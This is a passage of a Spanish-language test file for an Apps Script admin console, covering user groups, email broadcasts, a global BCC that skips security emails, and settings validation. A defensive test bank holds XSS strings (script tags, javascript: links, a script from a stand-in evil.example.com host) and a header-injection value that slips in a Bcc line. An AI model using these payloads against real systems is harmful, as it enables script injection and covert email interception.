/*
 * Pruebas de la consola ampliada (fase 9).   Ejecutar:  node pruebas/f9_consola.test.js
 *
 * Cubre lo que estrena F9: grupos de personas, difusión de correo interno, la sección de
 * métricas/monitoreo, la bitácora por fechas, la copia oculta global y los ajustes que
 * salieron del código.
 *
 * DOS COSAS QUE SE PRUEBAN CON ESPECIAL SAÑA, porque son las que hacen daño si fallan:
 *
 *   1. LA COPIA OCULTA NO PUEDE TOCAR LOS CORREOS DE SEGURIDAD. Contraseñas temporales y
 *      códigos de verificación comparten la función de envío con los avisos normales, así
 *      que el diseño es opt-in: quien no pide el CCO, no lo lleva. Aquí se comprueba que
 *      falla cerrado, y no solo que funciona cuando se pide.
 *
 *   2. EL CUERPO DE UNA DIFUSIÓN NUNCA ES HTML AJENO. Llega como bloques, se sanea y se
 *      pinta con las piezas de la plantilla, que escapan todo. El banco hostil de abajo
 *      mete `javascript:`, etiquetas y tipos inventados y comprueba que salen inertes.
 *
 * Se cargan los .gs REALES en un contexto compartido —como en Apps Script— sobre hojas de
 * cálculo fingidas. La capa de identidad (Seguridad.gs) va fingida a propósito: aquí se
 * prueba lo que estrena esta fase, no el gate de la casa, que ya tiene sus pruebas.
 */
const fs = require('fs');
const vm = require('vm');
const path = require('path');

const PROY = path.join(__dirname, '..', 'Carpeta del proyecto');

let pruebas = 0, fallos = 0;
function ok(nombre, cond, extra) {
  pruebas++;
  if (cond) { console.log(`  ✔ ${nombre}`); return; }
  fallos++;
  console.log(`  ✘ ${nombre}${extra ? '  → ' + extra : ''}`);
}
function eq(nombre, real, esperado) {
  ok(nombre, real === esperado, `esperaba ${JSON.stringify(esperado)}, llegó ${JSON.stringify(real)}`);
}

/* ── Hoja de cálculo fingida (la misma de f7 y f8) ───────────────────────────── */
function hoja(nombre, filas) {
  const datos = filas.map((f) => f.slice());
  const anchoMax = () => Math.max(26, datos.reduce((m, f) => Math.max(m, f.length), 0));
  const api = {
    _datos: datos,
    getName: () => nombre,
    getLastRow: () => datos.length,
    getLastColumn: () => datos.reduce((m, f) => Math.max(m, f.length), 0),
    getMaxColumns: anchoMax,
    getMaxRows: () => Math.max(1000, datos.length),
    setFrozenRows: () => api,
    setColumnWidth: () => api,
    insertColumnsAfter: () => api,
    appendRow: (row) => { datos.push(row.slice()); return api; },
    deleteRow: (i) => { datos.splice(i - 1, 1); return api; },
    getDataRange: () => api.getRange(1, 1, datos.length, api.getLastColumn()),
    getRange: (fila, col, nFilas, nCols) => {
      nFilas = nFilas === undefined ? 1 : nFilas;
      nCols = nCols === undefined ? 1 : nCols;
      if (fila < 1 || col < 1) throw new Error('getRange fuera de rango');
      if (col + nCols - 1 > anchoMax()) throw new Error('getRange excede las columnas de la hoja');
      const rango = {
        getValues: () => {
          const out = [];
          for (let r = 0; r < nFilas; r++) {
            const src = datos[fila - 1 + r] || [];
            const linea = [];
            for (let c = 0; c < nCols; c++) linea.push(src[col - 1 + c] === undefined ? '' : src[col - 1 + c]);
            out.push(linea);
          }
          return out;
        },
        getValue: () => {
          const src = datos[fila - 1] || [];
          return src[col - 1] === undefined ? '' : src[col - 1];
        },
        setValues: (vals) => {
          for (let r = 0; r < vals.length; r++) {
            const destino = fila - 1 + r;
            if (!datos[destino]) datos[destino] = [];
            for (let c = 0; c < vals[r].length; c++) datos[destino][col - 1 + c] = vals[r][c];
          }
          return rango;
        },
        setValue: (v) => {
          if (!datos[fila - 1]) datos[fila - 1] = [];
          datos[fila - 1][col - 1] = v;
          return rango;
        },
        setFontWeight: () => rango
      };
      return rango;
    }
  };
  return api;
}

function libro(hojas) {
  return {
    getName: () => 'Libro de prueba',
    getSheetByName: (n) => hojas[n] || null,
    insertSheet: (n) => { hojas[n] = hoja(n, []); return hojas[n]; }
  };
}

/* ── El equipo de prueba ──────────────────────────────────────────────────────
   Tres niveles, que es lo que hace falta para probar el recorte jerárquico:
   la maestra ve todo, el supervisor su nivel hacia abajo, y el asesor —aunque tenga
   'sup_equipo' por excepción— no toca grupos. */
const GENTE = {
  'maestra@ventel.com':    { nombre: 'Maestra Total',  nivel: 3, rol: 'maestro',  maestro: true,  activo: true },
  'super@ventel.com':      { nombre: 'Super Visor',    nivel: 2, rol: 'avanzado', maestro: false, activo: true },
  'super2@ventel.com':     { nombre: 'Otra Super',     nivel: 2, rol: 'avanzado', maestro: false, activo: true },
  'asesor@ventel.com':     { nombre: 'Ana Asesora',    nivel: 1, rol: 'normal',   maestro: false, activo: true },
  'asesor2@ventel.com':    { nombre: 'Beto Asesor',    nivel: 1, rol: 'normal',   maestro: false, activo: true },
  'debaja@ventel.com':     { nombre: 'Ya No Está',     nivel: 1, rol: 'normal',   maestro: false, activo: false },
  // Un asesor con 'sup_equipo' concedido a mano: entra a la consola, pero NO a los grupos.
  'coordina@ventel.com':   { nombre: 'Coord Inador',   nivel: 1, rol: 'normal',   maestro: false, activo: true, supEquipo: true }
};

function cargar(hojas, opciones) {
  opciones = opciones || {};
  hojas = hojas || {};
  const cacheScript = {};
  const props = Object.assign({}, opciones.props || {});
  const enviados = [];
  const estado = { hojas, cache: cacheScript, props, enviados, cuota: opciones.cuota === undefined ? 500 : opciones.cuota };

  const ctx = {
    JSON, String, Number, Object, Array, Math, Date, RegExp, isNaN, parseInt, parseFloat, console,
    Logger: { log: () => {} },
    Session: {
      getScriptTimeZone: () => 'America/Mexico_City',
      getActiveUser: () => ({ getEmail: () => 'sistema@ventel.com' })
    },
    Utilities: {
      DigestAlgorithm: { MD5: 'MD5' },
      Charset: { UTF_8: 'UTF-8' },
      computeDigest: (a, txt) => Array.from(require('crypto').createHash('md5').update(String(txt), 'utf8').digest())
        .map((b) => (b > 127 ? b - 256 : b)),
      base64Decode: (s) => Array.from(Buffer.from(String(s), 'base64')),
      newBlob: (bytes, mime, nombre) => ({
        _bytes: bytes, _mime: mime, _nombre: nombre,
        setName: function (n) { this._nombre = n; return this; },
        getName: function () { return this._nombre; }
      }),
      formatDate: (d, tz, fmt) => {
        const p = (n) => String(n).padStart(2, '0');
        if (fmt === 'yyyy-MM-dd') return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())}`;
        return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}`;
      }
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (k in cacheScript ? cacheScript[k] : null),
        put: (k, v) => { cacheScript[k] = v; },
        remove: (k) => { delete cacheScript[k]; }
      }),
      getUserCache: () => ({ get: () => null, put: () => {}, remove: () => {} })
    },
    LockService: {
      getScriptLock: () => ({
        tryLock: () => opciones.lockDisponible !== false,
        waitLock: () => { if (opciones.lockDisponible === false) throw new Error('sin candado'); },
        releaseLock: () => {}
      })
    },
    SpreadsheetApp: {
      flush: () => {},
      getActiveSpreadsheet: () => libro(hojas),
      openById: () => libro(hojas)
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = v; },
        deleteProperty: (k) => { delete props[k]; },
        getProperties: () => Object.assign({}, props)
      })
    },
    DriveApp: {},
    CalendarApp: {},
    ScriptApp: { getService: () => ({ getUrl: () => 'https://script.google.com/a/macros/x/exec' }) },
    MailApp: {
      getRemainingDailyQuota: () => estado.cuota,
      sendEmail: (para, asunto, plano, op) => { enviados.push({ via: 'MailApp', para, asunto, plano, op }); }
    },
    GmailApp: {
      getAliases: () => (opciones.conAlias ? ['cotizacion@liverpool.com.mx'] : []),
      sendEmail: (para, asunto, plano, op) => { enviados.push({ via: 'GmailApp', para, asunto, plano, op }); }
    },

    /* ── Capa de identidad y permisos, fingida ───────────────────────────────── */
    REGISTROS_SHEET_NAME: 'Registros',
    COTIZACIONES_SHEET_NAME: 'Cotizaciones',
    CUENTAS_COL_TEMPORAL: 'PasswordTemporal',
    secNormalizarCorreo_: (c) => String(c == null ? '' : c).trim().toLowerCase(),
    secEscapeHtml_: (s) => String(s == null ? '' : s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;').replace(/'/g, '&#39;'),
    secConfig_: (clave, respaldo) => (clave in props && props[clave] !== '' ? props[clave] : (respaldo || '')),
    secIdentidad_: (correo) => {
      const c = String(correo || '').trim().toLowerCase();
      const u = GENTE[c];
      if (!u) return { ok: false, email: c, error: 'sin sesión' };
      return { ok: true, email: c, nombre: u.nombre, maestro: u.maestro, rol: u.rol };
    },
    // La puerta de los ajustes: consolaGate_ pasa por aquí y solo deja entrar al maestro.
    secIdentidadMaestra_: (correo) => {
      const c = String(correo || '').trim().toLowerCase();
      const u = GENTE[c];
      if (!u) return { ok: false, email: c, error: 'sin sesión' };
      if (!u.maestro) {
        return { ok: false, email: c, nombre: u.nombre, maestro: false, bloques: [],
                 error: 'Solo el rol maestro puede entrar a la consola de administración.' };
      }
      return { ok: true, email: c, nombre: u.nombre, maestro: true, rol: u.rol,
               bloques: ['adm_miembros', 'adm_permisos', 'adm_ajustes', 'adm_modulos',
                         'adm_formatos', 'adm_salud', 'adm_bitacora'] };
    },
    secIndiceRegistros_: () => {
      const out = {};
      Object.keys(GENTE).forEach((c) => { out[c] = { nombre: GENTE[c].nombre, avanzado: GENTE[c].nivel >= 2, alta: '', fila: 2 }; });
      return out;
    },
    permUsuario_: (correo) => {
      const c = String(correo || '').trim().toLowerCase();
      const u = GENTE[c];
      if (!u) return { encontrado: false, email: c, bloques: [], rol: 'normal', activo: false };
      const bloques = ['portal'];
      if (u.nivel >= 2 || u.supEquipo) bloques.push('sup_equipo');
      if (u.nivel >= 2) bloques.push('metricas', 'supervision');
      if (u.maestro) bloques.push('adm_miembros', 'adm_permisos', 'adm_ajustes', 'adm_modulos',
                                  'adm_formatos', 'adm_salud', 'adm_bitacora', 'metricas');
      return { encontrado: true, email: c, nombre: u.nombre, rol: u.rol, rolNombre: u.rol,
               maestro: u.maestro, activo: u.activo, bloques: bloques, ajustes: { mas: [], menos: [] } };
    },
    permNivelUsuario_: (u) => (u && u.email && GENTE[u.email] ? GENTE[u.email].nivel : 1),
    permMismoCorreo_: (a, b) => {
      const n = (x) => String(x == null ? '' : x).trim().toLowerCase();
      return n(a) !== '' && n(a) === n(b);
    },
    permBloque_: (id) => ({ id: id, nombre: id, fijo: false }),
    permModulosApagados_: () => (opciones.apagados || []),
    permCatalogo_: () => ({ bloques: [], grupos: [], roles: [], apagados: [] }),
    permCatalogoPara_: () => ({ bloques: [], grupos: [], roles: [], apagados: [] }),
    permListaMaestros_: () => ['maestra@ventel.com'],
    getFormatSettings: () => ({ success: true, formats: [] }),
    revisionMaestra: () => ({ checks: [], ok: true }),
    cotInvalidarCache_: () => { estado.cacheTirada = (estado.cacheTirada || 0) + 1; },
    cotHash_: (t) => 'h' + String(t).length + String(t).charCodeAt(0),
    metVerificarAsesor_: (correo) => ctx.secIdentidad_(correo)
  };

  ctx.globalThis = ctx;
  vm.createContext(ctx);

  // El orden importa poco —Apps Script carga todo en un ámbito común—, pero se respeta el
  // de dependencia para que un fallo de carga señale al archivo correcto.
  ['Metricas.gs', 'Correos.gs', 'Cuentas.gs', 'Consola.gs', 'Grupos.gs', 'Difusion.gs', 'Monitoreo.gs']
    .forEach((f) => {
      const src = fs.readFileSync(path.join(PROY, f), 'utf8');
      try {
        vm.runInContext(src, ctx, { filename: f });
      } catch (e) {
        console.log('  ✘ no se pudo cargar ' + f + ': ' + e.message);
        fallos++;
      }
    });

  vm.runInContext([
    'this.grpListar = grpListar; this.grpGuardar = grpGuardar; this.grpEliminar = grpEliminar;',
    'this.grpFijarMiembros = grpFijarMiembros; this.grpCorreosDe_ = grpCorreosDe_;',
    'this.grpVentel_ = grpVentel_; this.grpParsearMiembros_ = grpParsearMiembros_;',
    'this.grpClaveNombre_ = grpClaveNombre_; this.GRP_SHEET = GRP_SHEET; this.GRP_HEADERS = GRP_HEADERS;',
    'this.difSanear_ = difSanear_; this.difCuerpoHtml_ = difCuerpoHtml_; this.difUrlSegura_ = difUrlSegura_;',
    'this.difEnviar = difEnviar; this.difPrevia = difPrevia; this.difPreparar = difPreparar;',
    'this.difCuerpoPlano_ = difCuerpoPlano_;',
    'this.monCols_ = monCols_; this.monPlano_ = monPlano_; this.monSoloDigitos_ = monSoloDigitos_;',
    'this.monRegistrarBusqueda_ = monRegistrarBusqueda_; this.monBusquedasHoja_ = monBusquedasHoja_;',
    'this.monPanorama = monPanorama; this.monCotizaciones = monCotizaciones; this.monCorreos = monCorreos;',
    'this.monBusquedas = monBusquedas; this.monPuedeVer_ = monPuedeVer_; this.MON_BUSQ_HEADERS = MON_BUSQ_HEADERS;',
    'this.consolaRangoFechas_ = consolaRangoFechas_; this.consolaBitacoraRango = consolaBitacoraRango;',
    'this.consolaValidarAjuste_ = consolaValidarAjuste_; this.consolaGuardarAjuste = consolaGuardarAjuste;',
    'this.consolaLeerAjustes_ = consolaLeerAjustes_; this.consolaEnlacesAjustes_ = consolaEnlacesAjustes_;',
    'this.consolaRecomendaciones_ = consolaRecomendaciones_; this.consolaBitacoraApuntar_ = consolaBitacoraApuntar_;',
    'this.CONSOLA_AJUSTES = CONSOLA_AJUSTES; this.CONSOLA_SECCIONES = CONSOLA_SECCIONES;',
    'this.CONSOLA_GRUPOS_AJUSTES = CONSOLA_GRUPOS_AJUSTES; this.CONSOLA_BITACORA_SHEET = CONSOLA_BITACORA_SHEET;',
    'this.correoCcoGlobal_ = correoCcoGlobal_; this.correoAplicarCco_ = correoAplicarCco_;',
    'this.mailAlias_ = mailAlias_; this.cuentasEnviarCorreo_ = cuentasEnviarCorreo_;',
    'this.metRegistrarEnvio_ = metRegistrarEnvio_; this.metCabecera_ = metCabecera_; this.MET_HEADERS = MET_HEADERS;'
  ].join(''), ctx, { filename: 'exportar' });

  ctx.__estado = estado;
  return ctx;
}

const MAESTRA = 'maestra@ventel.com';
const SUPER = 'super@ventel.com';
const ASESOR = 'asesor@ventel.com';
const COORD = 'coordina@ventel.com';

function hojaGrupos(filas) {
  return hoja('Grupos', [['ID', 'Nombre', 'Detalle', 'Miembros (JSON)', 'Creado', 'Creado por', 'Actualizado', 'Actualizado por']]
    .concat(filas || []));
}

/* ══════════════════════════════════════════════════════════════════════════════ */
console.log('\n1. GRUPOS · el modelo (T9.1)');
{
  const ctx = cargar({});
  const r = ctx.grpGuardar(SUPER, { nombre: 'Turno matutino', detalle: 'Los de la mañana' });
  ok('un supervisor crea un grupo', r.success === true, JSON.stringify(r));
  ok('la hoja se creó con sus encabezados',
     ctx.__estado.hojas['Grupos'] && ctx.__estado.hojas['Grupos']._datos[0].join('|') === ctx.GRP_HEADERS.join('|'),
     JSON.stringify(ctx.__estado.hojas['Grupos'] && ctx.__estado.hojas['Grupos']._datos[0]));

  const lista = ctx.grpListar(SUPER);
  eq('la lista trae el virtual y el nuevo', lista.grupos.length, 2);
  eq('«Ventel» va primero', lista.grupos[0].id, 'ventel');
  ok('«Ventel» viene marcado como virtual', lista.grupos[0].virtual === true);
  ok('«Ventel» no incluye a quien está de baja',
     lista.grupos[0].miembros.every((m) => m.email !== 'debaja@ventel.com'),
     JSON.stringify(lista.grupos[0].miembros.map((m) => m.email)));
  eq('el grupo nuevo nace vacío', lista.grupos[1].total, 0);

  const dup = ctx.grpGuardar(SUPER, { nombre: 'turno  MATUTINO' });
  ok('no deja dos grupos con el mismo nombre aunque cambien acentos y mayúsculas',
     dup.success === false && /ya hay un grupo/i.test(dup.message), JSON.stringify(dup));

  const corto = ctx.grpGuardar(SUPER, { nombre: 'x' });
  ok('rechaza un nombre de una letra', corto.success === false, JSON.stringify(corto));

  const virtual = ctx.grpGuardar(SUPER, { id: 'ventel', nombre: 'Otra cosa' });
  ok('«Ventel» no se puede editar', virtual.success === false, JSON.stringify(virtual));
  const borrarVirtual = ctx.grpEliminar(SUPER, 'ventel');
  ok('«Ventel» no se puede borrar', borrarVirtual.success === false, JSON.stringify(borrarVirtual));
}

console.log('\n2. GRUPOS · el gate es por NIVEL, no por bloque (criterio 1 de la fase)');
{
  const ctx = cargar({});
  const r = ctx.grpGuardar(COORD, { nombre: 'Mi grupo' });
  ok('un asesor con sup_equipo NO puede crear grupos', r.success === false, JSON.stringify(r));
  ok('y se le dice por qué, no un "no autorizado" seco',
     /supervis/i.test(r.message || ''), r.message);

  const lectura = ctx.grpListar(COORD);
  ok('tampoco puede LEER la lista de grupos', lectura.success === false, JSON.stringify(lectura));

  const sinSesion = ctx.grpListar('nadie@fuera.com');
  ok('sin sesión válida, nada', sinSesion.success === false);

  const maestra = ctx.grpListar(MAESTRA);
  ok('la maestra sí entra', maestra.success === true, JSON.stringify(maestra));
}

console.log('\n3. GRUPOS · miembros (T9.1) y correos para copiar (T9.2)');
{
  const ctx = cargar({});
  const creado = ctx.grpGuardar(SUPER, { nombre: 'Coordinación' });
  const id = creado.id;

  const r = ctx.grpFijarMiembros(SUPER, id, [ASESOR, 'asesor2@ventel.com', 'nadie@fuera.com', ASESOR]);
  ok('guarda los miembros', r.success === true, JSON.stringify(r));
  ok('descarta a quien no está dado de alta y lo dice',
     /nadie@fuera\.com/.test(r.aviso || ''), r.aviso);

  const g = r.grupos.filter((x) => x.id === id)[0];
  eq('no repite a quien llegó dos veces', g.total, 2);

  const otra = ctx.grpFijarMiembros(SUPER, id, [ASESOR, 'asesor2@ventel.com']);
  eq('fijar los mismos dos es idempotente', otra.grupos.filter((x) => x.id === id)[0].total, 2);

  ctx.grpFijarMiembros(SUPER, id, [ASESOR, 'debaja@ventel.com']);
  const conBaja = ctx.grpListar(SUPER).grupos.filter((x) => x.id === id)[0];
  eq('a quien está de baja se le sigue viendo en la lista', conBaja.total, 2);
  eq('pero no cuenta como alcanzable', conBaja.alcanzables, 1);
  eq('y no entra en los correos a los que se manda', ctx.grpCorreosDe_(id).length, 1);
  eq('el que queda es el activo', ctx.grpCorreosDe_(id)[0], ASESOR);

  const borrado = ctx.grpEliminar(SUPER, id);
  ok('el grupo se borra', borrado.success === true, JSON.stringify(borrado));
  eq('y desaparece de la lista', borrado.grupos.length, 1);
}

console.log('\n3 bis. GRUPOS · dos personas editando a la vez no se pisan');
{
  const ctx = cargar({});
  const g = ctx.grpGuardar(SUPER, { nombre: 'Coordinación' }).id;
  ctx.grpFijarMiembros(SUPER, g, [ASESOR, 'asesor2@ventel.com']);

  /* A y B tienen la consola abierta con [asesor, asesor2] delante.
     A añade a super2. B, sin recargar, quita a asesor2 y manda SU lista (la vieja menos uno).
     Sin fusión, la segunda escritura borraba a super2 sin que nadie se enterara. */
  const base = [ASESOR, 'asesor2@ventel.com'];
  ctx.grpFijarMiembros(SUPER, g, base.concat(['super2@ventel.com']), base);
  const r = ctx.grpFijarMiembros('super2@ventel.com', g, [ASESOR], base);

  const quedan = r.grupos.filter((x) => x.id === g)[0].miembros.map((m) => m.email).sort();
  eq('quedan los dos cambios, no el último que guardó', quedan.join(','), 'asesor@ventel.com,super2@ventel.com');

  // Sin `base` (una llamada vieja o hecha a mano) se conserva el fijar de siempre.
  const sinBase = ctx.grpFijarMiembros(SUPER, g, [ASESOR]);
  eq('sin base se fija la lista tal cual', sinBase.grupos.filter((x) => x.id === g)[0].total, 1);
}

console.log('\n3 ter. GRUPOS · el veto jerárquico se aplica a las ALTAS, no a la lista entera');
{
  const ctx = cargar({});
  const g = ctx.grpGuardar(MAESTRA, { nombre: 'Dirección' }).id;
  // La maestra se mete a sí misma y a un asesor: ella no tiene veto.
  ctx.grpFijarMiembros(MAESTRA, g, [MAESTRA, ASESOR]);

  // Ahora un supervisor edita ese grupo: añade a otro asesor.
  const base = [MAESTRA, ASESOR];
  const r = ctx.grpFijarMiembros(SUPER, g, base.concat(['asesor2@ventel.com']), base);
  const miembros = r.grupos.filter((x) => x.id === g)[0].miembros.map((m) => m.email).sort();
  ok('la maestra sigue en el grupo: editar no la expulsa', miembros.indexOf(MAESTRA) > -1, miembros.join(','));
  ok('y el alta del supervisor entra', miembros.indexOf('asesor2@ventel.com') > -1, miembros.join(','));

  // Pero NO puede añadir a alguien por encima de su nivel.
  const g2 = ctx.grpGuardar(SUPER, { nombre: 'Su equipo' }).id;
  const r2 = ctx.grpFijarMiembros(SUPER, g2, [MAESTRA, ASESOR], []);
  const m2 = r2.grupos.filter((x) => x.id === g2)[0].miembros.map((m) => m.email);
  ok('un supervisor no puede meter a un maestro en un grupo', m2.indexOf(MAESTRA) === -1, m2.join(','));
  ok('y se le dice por qué', /por encima de tu nivel/.test(r2.aviso || ''), r2.aviso);
  ok('el resto del alta sí entra', m2.indexOf(ASESOR) > -1, m2.join(','));
}

console.log('\n4. GRUPOS · la columna de miembros aguanta basura');
{
  const ctx = cargar({});
  eq('JSON normal', ctx.grpParsearMiembros_('["a@b.com","c@d.com"]').length, 2);
  eq('JSON roto se rescata como lista separada por comas',
     ctx.grpParsearMiembros_('a@b.com, c@d.com').length, 2);
  eq('celda vacía', ctx.grpParsearMiembros_('').length, 0);
  eq('normaliza a minúsculas y quita repetidos',
     ctx.grpParsearMiembros_('["A@B.com"," a@b.com "]').length, 1);
  eq('los nombres se comparan sin acentos', ctx.grpClaveNombre_('Coordinación'), 'coordinacion');
}

console.log('\n5. COPIA OCULTA GLOBAL · el candado de los correos de seguridad (T9.6)');
{
  // Con el CCO configurado, el emisor compartido NO lo aplica salvo que se lo pidan.
  const ctx = cargar({}, { props: { CORREO_CCO_GLOBAL: 'monitoreo@ventel.com' } });

  eq('el ajuste se lee y se parte bien', ctx.correoCcoGlobal_().join(','), 'monitoreo@ventel.com');

  ctx.cuentasEnviarCorreo_('alguien@ventel.com', 'Tu contraseña temporal', '<p>x</p>', 'x');
  const seguridad = ctx.__estado.enviados[0];
  ok('un correo de seguridad sale SIN copia oculta',
     !seguridad.op.bcc, JSON.stringify(seguridad.op));

  ctx.cuentasEnviarCorreo_('alguien@ventel.com', 'Aviso', '<p>x</p>', 'x', { cco: true });
  const aviso = ctx.__estado.enviados[1];
  eq('un aviso que la pide sí la lleva', aviso.op.bcc, 'monitoreo@ventel.com');

  // Y la mezcla con un bcc que ya existía (el que teclea el asesor).
  const op = { bcc: 'jefe@ventel.com' };
  const n = ctx.correoAplicarCco_(op, ['cliente@fuera.com']);
  eq('se añade sin pisar el CCO que ya había', op.bcc, 'jefe@ventel.com,monitoreo@ventel.com');
  eq('y dice cuántos añadió, para que la métrica cuente la verdad', n, 1);

  const op2 = { bcc: 'monitoreo@ventel.com' };
  eq('no se repite si ya estaba', ctx.correoAplicarCco_(op2, []), 0);
  eq('ni cambia el bcc', op2.bcc, 'monitoreo@ventel.com');

  const op3 = {};
  eq('tampoco se manda dos veces a quien ya recibe el correo',
     ctx.correoAplicarCco_(op3, ['monitoreo@ventel.com']), 0);
  ok('y en ese caso no aparece ningún bcc', !op3.bcc, JSON.stringify(op3));
}

console.log('\n6. COPIA OCULTA GLOBAL · apagada por omisión');
{
  const ctx = cargar({});
  eq('sin ajuste no hay buzones', ctx.correoCcoGlobal_().length, 0);
  const op = {};
  eq('y no se toca nada', ctx.correoAplicarCco_(op, []), 0);
  ok('el objeto de opciones queda limpio', Object.keys(op).length === 0);
}

console.log('\n7. AJUSTES · validación de los que estrena F9 (T9.6 y T9.7)');
{
  const ctx = cargar({});
  const def = (clave) => ctx.CONSOLA_AJUSTES.filter((a) => a.clave === clave)[0];

  ok('el CCO global está en el catálogo', !!def('CORREO_CCO_GLOBAL'));
  ok('y marcado como solo maestro', def('CORREO_CCO_GLOBAL').soloMaestro === true);
  ok('el alias de correo salió del código al catálogo', !!def('MAIL_ALIAS'));
  ok('y el nombre visible del remitente también', !!def('CC_SENDER_NAME'));
  ok('los tres viven en el grupo «Correo»',
     ['CORREO_CCO_GLOBAL', 'MAIL_ALIAS', 'CC_SENDER_NAME'].every((k) => def(k).grupo === 'Correo'));
  ok('y el grupo se pinta en la consola', ctx.CONSOLA_GRUPOS_AJUSTES.indexOf('Correo') > -1);

  const lista = ctx.consolaValidarAjuste_(def('CORREO_CCO_GLOBAL'), 'Uno@Ventel.com, dos@ventel.com');
  ok('acepta una lista de correos', lista.ok === true, JSON.stringify(lista));
  eq('y la normaliza', lista.valor, 'uno@ventel.com,dos@ventel.com');

  const malo = ctx.consolaValidarAjuste_(def('CORREO_CCO_GLOBAL'), 'esto no es un correo');
  ok('rechaza lo que no es un correo', malo.ok === false, JSON.stringify(malo));

  const muchos = ctx.consolaValidarAjuste_(def('CORREO_CCO_GLOBAL'),
    'a@b.com,c@d.com,e@f.com,g@h.com,i@j.com,k@l.com');
  ok('pone tope a cuántos buzones vigilan', muchos.ok === false, JSON.stringify(muchos));

  const vacio = ctx.consolaValidarAjuste_(def('CORREO_CCO_GLOBAL'), '');
  ok('vaciarlo lo apaga y lo avisa', vacio.ok === true && /sin copia oculta/i.test(vacio.aviso), JSON.stringify(vacio));

  const alias = ctx.consolaValidarAjuste_(def('MAIL_ALIAS'), 'Cotizacion@Liverpool.com.mx');
  eq('el alias se guarda en minúsculas', alias.valor, 'cotizacion@liverpool.com.mx');
  ok('un alias con espacios se rechaza', ctx.consolaValidarAjuste_(def('MAIL_ALIAS'), 'a b@c.com').ok === false);

  // Inyección de cabeceras: un salto de línea en el nombre del remitente.
  const nombre = ctx.consolaValidarAjuste_(def('CC_SENDER_NAME'), 'Ventel\nBcc: espia@fuera.com');
  ok('el nombre del remitente pierde los saltos de línea', nombre.valor.indexOf('\n') === -1, nombre.valor);
  ok('y queda en una sola línea legible', nombre.valor === 'Ventel Bcc: espia@fuera.com', nombre.valor);
}

console.log('\n8. AJUSTES · el candado «solo maestro» se exige en el servidor');
{
  const ctx = cargar({});
  // La maestra sí puede.
  const r = ctx.consolaGuardarAjuste(MAESTRA, 'CORREO_CCO_GLOBAL', 'monitoreo@ventel.com');
  ok('la maestra puede poner el CCO global', r.success === true, JSON.stringify(r));
  eq('y queda guardado en las propiedades', ctx.__estado.props.CORREO_CCO_GLOBAL, 'monitoreo@ventel.com');

  const s = ctx.consolaGuardarAjuste(SUPER, 'CORREO_CCO_GLOBAL', 'otro@ventel.com');
  ok('un supervisor no llega ni a la puerta de Ajustes', s.success === false, JSON.stringify(s));
  eq('y el valor no cambió', ctx.__estado.props.CORREO_CCO_GLOBAL, 'monitoreo@ventel.com');

  // Al leerlos sin ser maestro, el ajuste se marca de solo lectura.
  const comoSuper = ctx.consolaLeerAjustes_(false).filter((a) => a.clave === 'CORREO_CCO_GLOBAL')[0];
  ok('para quien no es maestro se pinta en modo consulta', comoSuper.soloLectura === true, JSON.stringify(comoSuper));
  const comoMaestra = ctx.consolaLeerAjustes_(true).filter((a) => a.clave === 'CORREO_CCO_GLOBAL')[0];
  ok('y para la maestra es editable', comoMaestra.soloLectura === false);
}

console.log('\n9. AJUSTES · los enlaces a lo que se configura en otra pantalla (T9.7)');
{
  const ctx = cargar({});
  const todos = ctx.consolaEnlacesAjustes_(['adm_formatos', 'adm_modulos', 'politica_revision']);
  eq('con todos los bloques salen los tres', todos.length, 3);
  const pocos = ctx.consolaEnlacesAjustes_(['adm_formatos']);
  eq('sin el bloque no se ofrece el atajo', pocos.length, 1);
  ok('cada enlace dice a dónde va', todos.every((e) => e.panel || e.pagina), JSON.stringify(todos));
}

console.log('\n10. DIFUSIÓN · banco hostil del cuerpo (T9.3)');
{
  const ctx = cargar({});
  const r = ctx.difSanear_([
    { tipo: 'parrafo', partes: [{ t: '<script>alert(1)</script>' }] },
    { tipo: 'parrafo', partes: [{ t: 'pulsa aquí', url: 'javascript:alert(1)' }] },
    { tipo: 'boton', texto: 'Entrar', url: 'javascript:alert(1)' },
    { tipo: 'boton', texto: 'Entrar', url: 'http://sin-tls.example.com' },
    { tipo: 'guion', src: 'https://evil.example.com/x.js' },
    { tipo: 'imagen', base64: 'AAAA', mime: 'text/html' },
    { tipo: 'parrafo', partes: [{ t: 'con control\x00\x08 dentro' }] },
    { tipo: 'nota', texto: 'esto sí vale', tono: 'inventado' }
  ]);

  eq('el <script> sobrevive como TEXTO', r.bloques[0].partes[0].t, '<script>alert(1)</script>');
  ok('el enlace javascript: pierde la URL y conserva el texto',
     r.bloques[1].partes[0].t === 'pulsa aquí' && !r.bloques[1].partes[0].url, JSON.stringify(r.bloques[1]));
  ok('un botón sin URL válida se descarta entero',
     !r.bloques.some((b) => b.tipo === 'boton'), JSON.stringify(r.bloques.map((b) => b.tipo)));
  ok('un tipo de bloque inventado no pasa',
     !r.bloques.some((b) => b.tipo === 'guion'), JSON.stringify(r.bloques.map((b) => b.tipo)));
  ok('una «imagen» que no es imagen no pasa',
     !r.bloques.some((b) => b.tipo === 'imagen'), JSON.stringify(r.bloques.map((b) => b.tipo)));
  ok('los caracteres de control se limpian',
     r.bloques[2].partes[0].t.indexOf('\x00') === -1, JSON.stringify(r.bloques[2]));
  const nota = r.bloques.filter((b) => b.tipo === 'nota')[0];
  eq('un tono inventado cae al neutro', nota.tono, '');
  ok('y se cuenta lo descartado', r.descartados >= 4, String(r.descartados));

  const urls = ['javascript:alert(1)', ' javascript:alert(1)', 'data:text/html,x', '//evil.com/x',
                'http://x.com', 'vbscript:x', 'https://ok.com/a b', ''];
  ok('ninguna URL hostil pasa por el saneador de enlaces',
     urls.every((u) => ctx.difUrlSegura_(u) === ''), urls.filter((u) => ctx.difUrlSegura_(u) !== '').join(' | '));
  eq('y una buena sí', ctx.difUrlSegura_('https://liverpool.com.mx/x?a=1'), 'https://liverpool.com.mx/x?a=1');
}

console.log('\n11. DIFUSIÓN · el HTML que sale está escapado');
{
  const ctx = cargar({});
  const saneado = ctx.difSanear_([
    { tipo: 'parrafo', partes: [{ t: '<b>no soy negrita</b>' }, { t: ' y esto sí', negrita: true }] },
